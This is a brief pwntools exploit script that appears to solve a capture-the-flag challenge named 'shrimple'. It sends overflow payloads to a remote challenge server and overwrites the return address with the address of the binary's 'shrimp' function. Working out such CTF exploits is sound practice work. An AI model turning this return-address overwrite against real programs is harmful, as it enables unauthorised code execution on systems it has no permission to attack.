from pwn import *

elf = context.binary = ELF('./shrimple', checksec=False)
context.terminal = ['alacritty', '-e', 'sh', '-c']

#io = process()
io = remote('chal.competitivecyber.club', 8884)

io.sendlineafter(b'>> ', b'A' * 38 + b'AAAAA\0')
io.sendlineafter(b'>> ', b'A' * 38 + b'AAAA\0')
io.sendlineafter(b'>> ', b'A' * 38 + flat(elf.symbols.shrimp+5))
#gdb.attach(io, gdbscript='b* 0x00000000004013da;c')

io.interactive()